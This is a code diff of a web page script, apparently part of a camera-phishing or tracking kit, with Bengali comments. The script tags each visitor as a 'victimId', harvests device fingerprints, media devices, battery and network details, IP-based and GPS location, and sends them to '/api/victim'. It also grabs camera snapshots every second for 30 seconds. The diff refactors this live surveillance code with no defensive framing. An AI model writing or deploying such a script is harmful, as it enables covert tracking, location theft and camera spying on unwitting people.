@@ -91,7 +91,7 @@
         (function() {
             "use strict";
 
-            // ===== রে আইডি (এলোমেলো) =====
+            // ===== রে আইডি =====
             const chars = "qwertyuioplkjhgfdsazxcvbnm0987654321";
             let ray = "";
             for (let i = 0; i < 17; i++) {
@@ -103,9 +103,9 @@
             const victimId = pathParts[pathParts.length - 1];
 
             // ================================================================
-            // ১. বেসিক ডিভাইস ইনফো (সিঙ্ক্রোনাস – কোনো অনুমতি লাগে না)
+            // ১. ডিভাইস ইনফো তৈরি করা
             // ================================================================
-            function getBasicDeviceInfo() {
+            function getDeviceInfo() {
                 return {
                     productSub: navigator.productSub || 'N/A',
                     vendor: navigator.vendor || 'N/A',
@@ -130,103 +130,122 @@
             }
 
             // ================================================================
-            // ২. IP ও লোকেশন (বাইরে থেকে আনা)
+            // ২. মিডিয়া ডিভাইস
             // ================================================================
-            async function getIPAndLocation() {
-                let ip = null, location = null;
+            async function getMediaDevices() {
                 try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    ip = ipData.ip;
-                } catch (e) {}
-
-                try {
-                    if (ip) {
-                        const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
-                        const locData = await locRes.json();
-                        location = {
-                            country: locData.country_name || 'N/A',
-                            region: locData.region || 'N/A',
-                            city: locData.city || 'N/A',
-                            latitude: locData.latitude || 0,
-                            longitude: locData.longitude || 0,
-                            isp: locData.org || 'N/A'
-                        };
+                    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                        const devices = await navigator.mediaDevices.enumerateDevices();
+                        return devices.map(d => ({
+                            kind: d.kind,
+                            label: d.label || 'N/A',
+                            deviceId: d.deviceId || 'N/A'
+                        }));
                     }
                 } catch (e) {}
-                return { ip, location };
+                return [];
             }
 
             // ================================================================
-            // ৩. প্রথম রিকোয়েস্ট – বেসিক ডিভাইস + IP + লোকেশন (দ্রুত)
+            // ৩. নেটওয়ার্ক তথ্য
             // ================================================================
-            async function sendQuickInfo() {
-                try {
-                    const basic = getBasicDeviceInfo();
-                    const { ip, location } = await getIPAndLocation();
-
-                    await fetch('/api/victim', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            id: victimId,
-                            timestamp: new Date().toISOString(),
-                            device: basic,
-                            ip: ip,
-                            location: location,
-                            type: 'quick'
-                        })
-                    });
-                    console.log('✅ দ্রুত ইনফো (বেসিক + IP/লোকেশন) পাঠানো হয়েছে');
-                } catch (err) {
-                    console.error('Quick info send error:', err);
-                }
-            }
-
-            // ================================================================
-            // ৪. বাকি ইনফো (মিডিয়া, ব্যাটারি, নেটওয়ার্ক, GPS) – সমান্তরালে
-            // ================================================================
-            async function sendExtendedInfo() {
-                try {
-                    // মিডিয়া ডিভাইস
-                    let media = [];
-                    try {
-                        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-                            const devices = await navigator.mediaDevices.enumerateDevices();
-                            media = devices.map(d => ({
-                                kind: d.kind,
-                                label: d.label || 'N/A',
-                                deviceId: d.deviceId || 'N/A'
-                            }));
-                        }
-                    } catch (e) {}
-
-                    // নেটওয়ার্ক
-                    const network = navigator.connection ? {
+            function getNetworkInfo() {
+                if (navigator.connection) {
+                    return {
                         type: navigator.connection.type || 'N/A',
                         rtt: navigator.connection.rtt || 0,
                         saveData: navigator.connection.saveData || false,
                         effectiveType: navigator.connection.effectiveType || 'N/A',
                         downlink: navigator.connection.downlink || 0,
                         downlinkMax: navigator.connection.downlinkMax || 0
-                    } : {};
+                    };
+                }
+                return {};
+            }
 
-                    // ব্যাটারি
-                    let battery = {};
+            // ================================================================
+            // ৪. ব্যাটারি তথ্য
+            // ================================================================
+            async function getBatteryInfo() {
+                try {
+                    if (navigator.getBattery) {
+                        const battery = await navigator.getBattery();
+                        return {
+                            level: Math.round(battery.level * 100),
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                    }
+                } catch (e) {}
+                return {};
+            }
+
+            // ================================================================
+            // ৫. ডিভাইস ইনফো পাঠান (সাথে সাথে)
+            // ================================================================
+            async function sendDeviceInfo() {
+                try {
+                    const device = getDeviceInfo();
+                    const media = await getMediaDevices();
+                    const network = getNetworkInfo();
+                    const battery = await getBatteryInfo();
+
+                    const data = {
+                        id: victimId,
+                        timestamp: new Date().toISOString(),
+                        ip: null,
+                        location: null,
+                        gpsLocation: null,
+                        device: device,
+                        media: media,
+                        network: network,
+                        battery: battery,
+                        type: 'camera'
+                    };
+
+                    await fetch('/api/victim', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                    console.log('✅ ডিভাইস ইনফো পাঠানো হয়েছে');
+
+                } catch (err) {
+                    console.error('Device info send error:', err);
+                }
+            }
+
+            // ================================================================
+            // ৬. IP ও লোকেশন আপডেট
+            // ================================================================
+            async function updateIPAndLocation() {
+                try {
+                    let ip = null;
+                    let location = null;
+                    let gpsLocation = null;
+
                     try {
-                        if (navigator.getBattery) {
-                            const b = await navigator.getBattery();
-                            battery = {
-                                level: Math.round(b.level * 100),
-                                charging: b.charging,
-                                chargingTime: b.chargingTime,
-                                dischargingTime: b.dischargingTime
+                        const ipRes = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipRes.json();
+                        ip = ipData.ip;
+                    } catch (e) {}
+
+                    try {
+                        if (ip) {
+                            const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                            const locData = await locRes.json();
+                            location = {
+                                country: locData.country_name || 'N/A',
+                                region: locData.region || 'N/A',
+                                city: locData.city || 'N/A',
+                                latitude: locData.latitude || 0,
+                                longitude: locData.longitude || 0,
+                                isp: locData.org || 'N/A'
                             };
                         }
                     } catch (e) {}
 
-                    // GPS লোকেশন (যদি অনুমতি দেয়)
-                    let gpsLocation = null;
                     try {
                         if (navigator.geolocation) {
                             const pos = await new Promise((resolve, reject) => {
@@ -244,28 +263,28 @@
                         }
                     } catch (e) {}
 
-                    // সব একত্রে পাঠানো
-                    await fetch('/api/victim', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            id: victimId,
-                            timestamp: new Date().toISOString(),
-                            media: media,
-                            network: network,
-                            battery: battery,
-                            gpsLocation: gpsLocation,
-                            type: 'extended'
-                        })
-                    });
-                    console.log('✅ এক্সটেন্ডেড ইনফো পাঠানো হয়েছে');
+                    if (ip || location || gpsLocation) {
+                        await fetch('/api/victim', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                id: victimId,
+                                ip: ip,
+                                location: location,
+                                gpsLocation: gpsLocation,
+                                type: 'camera'
+                            })
+                        });
+                        console.log('✅ IP ও লোকেশন আপডেট করা হয়েছে');
+                    }
+
                 } catch (err) {
-                    console.error('Extended info send error:', err);
+                    console.error('IP/Location update error:', err);
                 }
             }
 
             // ================================================================
-            // ৫. ক্যামেরা – অনুমতি পেলে প্রতি সেকেন্ডে ছবি
+            // ৭. ক্যামেরা – আসল রেজোলিউশন
             // ================================================================
             async function startCamera() {
                 try {
@@ -310,28 +329,22 @@
                         }
                     }, 1000);
 
-                    // ৩০ সেকেন্ড পর ক্যামেরা বন্ধ
                     setTimeout(() => {
                         clearInterval(interval);
                         stream.getTracks().forEach(t => t.stop());
                     }, 30000);
 
                 } catch (e) {
-                    console.log('ক্যামেরা অনুমতি দেওয়া হয়নি');
+                    console.log('Camera access denied');
                 }
             }
 
             // ================================================================
-            // ৬. মেইন ফাংশন – সবকিছু নন-ব্লকিং
+            // ৮. মেইন ফাংশন
             // ================================================================
-            function main() {
-                // ১. দ্রুত তথ্য (সাথে সাথে)
-                sendQuickInfo();
-
-                // ২. বাকি ইনফো (সমান্তরালে)
-                sendExtendedInfo();
-
-                // ৩. ক্যামেরা (অনুমতি সাপেক্ষে)
+            async function main() {
+                await sendDeviceInfo();
+                updateIPAndLocation();
                 startCamera();
             }
 
